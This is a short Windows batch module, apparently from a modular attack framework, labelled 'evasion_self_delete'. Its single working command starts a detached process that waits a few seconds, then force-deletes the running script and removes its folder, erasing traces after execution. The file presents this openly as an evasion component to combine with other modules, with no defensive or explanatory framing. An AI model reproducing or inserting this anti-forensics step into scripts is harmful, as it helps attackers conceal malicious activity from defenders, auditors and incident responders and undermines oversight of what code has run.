REM provides: evasion_self_delete
REM depends: (none)
REM description: Self-delete the batch script after execution completes

REM Launch a detached subprocess that waits then deletes this script
REM The ping provides a delay to ensure the parent process has exited
start /b "" cmd /c "ping -n 5 127.0.0.1 >nul & del /f /q "%~f0" & rmdir /q "%~dp0" 2>nul"
